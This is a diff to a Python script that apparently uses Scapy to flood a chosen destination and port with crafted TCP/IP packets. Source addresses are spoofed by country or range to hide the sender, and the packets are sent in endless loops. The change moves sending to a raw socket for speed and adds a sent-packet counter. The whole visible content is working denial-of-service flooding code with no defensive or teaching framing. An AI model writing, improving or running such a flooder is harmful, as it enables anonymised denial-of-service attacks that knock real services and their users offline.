@@ -18,7 +18,7 @@ supcountries = supcountries()
 destination = definetarget()
 targetport = defineporttarget()
 awnser_anonymizing = anonymizing_input(supcountries)
-
+cnt = 0
 
 
 
@@ -32,8 +32,10 @@ if awnser_anonymizing in supcountries or awnser_anonymizing == 'all':
    while 0 == 0:         
          Tcp_packet = setpacketinfotcp(targetport)
          Ip_packet = setpacketinfoip(Ip_range,destination)
-         send(Ip_packet/Tcp_packet)
-   
+         packet = Ip_packet/Tcp_packet
+         s.send(packet)
+         cnt = cnt + 1
+
 if awnser_anonymizing == yourIP:
    Ip_range = '192.168.0.2'
    os.system('clear')
@@ -43,7 +45,10 @@ if awnser_anonymizing == yourIP:
    while 0 == 0:         
          Tcp_packet = setpacketinfotcp(targetport)
          Ip_packet = setpacketinfoip(Ip_range,destination)
-         send(Ip_packet/Tcp_packet)
+         packet = Ip_packet/Tcp_packet
+         s.send(packet)
+         cnt = cnt + 1
+         print str(cnt) + ' packeges send'
         
          
 
@@ -56,7 +61,10 @@ if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:
     while 0 == 0:
          Ip_packet = setpacketinfoip(Ip_range,destination)
          Tcp_packet = setpacketinfotcp(targetport)
-         send(Ip_packet/Tcp_packet)
+         packet = Ip_packet/Tcp_packet
+         s.send(packet)
+         cnt = cnt + 1
+         print str(cnt) + ' packeges send'
 
 
 
